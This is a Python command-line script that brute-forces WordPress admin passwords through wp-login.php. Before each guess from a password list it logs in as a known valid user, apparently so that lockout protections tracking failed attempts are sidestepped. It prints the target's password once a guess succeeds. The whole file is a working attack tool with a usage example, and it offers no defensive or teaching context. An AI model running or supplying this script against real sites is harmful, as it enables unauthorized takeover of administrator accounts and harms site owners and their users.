import requests
import re
from sys import argv



def main(args):

   
    PASSWORDS = open(args["password_file"],'r').readlines()

    TROJAN_USER = (args["known_user"],args["known_passwd"])

    TARGET_USER = args["target_user"]
    
    HOST = args["host"]

    cookies = {
        'wp_lang': 'en_US',
        'wordpress_test_cookie': 'WP%20Cookie%20check'
    }

    for password in PASSWORDS:
        if password:
            
            print(f"Testing: {password}")
            
            requests.post(HOST,{
                                    'log': TROJAN_USER[0],
                                    'pwd': TROJAN_USER[1],
                                    'wp-submit': 'Log In',
                                    'redirect_to' : f'{HOST}?loggedout=true',
                                    'testcookie': 1
                                    }, cookies=cookies)

            result = requests.post(HOST,{
                                    'log': TARGET_USER,
                                    'pwd': password,
                                    'wp-submit': 'Log In',
                                    'testcookie': 1
                                    }, cookies=cookies)

            if not re.search('is incorrect',result.text):
               print(f"Password for {TARGET_USER} is {password}")
               exit()



if __name__ == "__main__":

    if len(argv) < 10:
        print("USAGE: python main.py -h LOGIN_HOST -u KNOWN_USER -p KNOWN_PASSWORD -t TARGET_USER -f PASSWORDS_TXT_FILE")
        print("Example:")
        print("python main.py -h http://wordpress.site/wp-login.php -u think -p 123 -t admin -f passwords.txt")
        exit()
    
    args = {}

    for i, argument in enumerate(argv):
        
        if argument == "-h" or argument == "--host" :
            args["host"] = argv[i + 1]
        
        elif argument == "-u" or argument == "--user":
            args["known_user"] = argv[i + 1]
            
        elif argument == "-p" or argument == "--password":
            args["known_passwd"] = argv[i + 1]
         
        elif argument == "-t" or argument == "--target-user":
            args["target_user"] = argv[i + 1]
        
        elif argument == "-f" or argument == "--password-file":
            args["password_file"] = argv[i + 1]
            
   
    main(args)
